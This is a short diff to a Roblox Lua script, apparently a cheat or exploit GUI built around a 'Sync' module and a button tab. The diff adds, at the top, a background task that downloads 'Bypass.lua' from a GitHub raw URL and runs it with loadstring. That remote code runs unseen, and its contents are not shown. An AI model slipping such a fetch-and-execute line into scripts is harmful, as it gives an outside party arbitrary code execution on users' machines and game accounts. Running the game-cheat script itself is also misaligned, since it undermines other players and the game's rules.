@@ -1,3 +1,6 @@
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/VisualUnboxer/refs/heads/main/Bypass.lua",true))()
+end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Sync = require(ReplicatedStorage.Database.Sync)
@@ -77,3 +80,4 @@ Tab:CreateButton({
        end
    end
 })
+
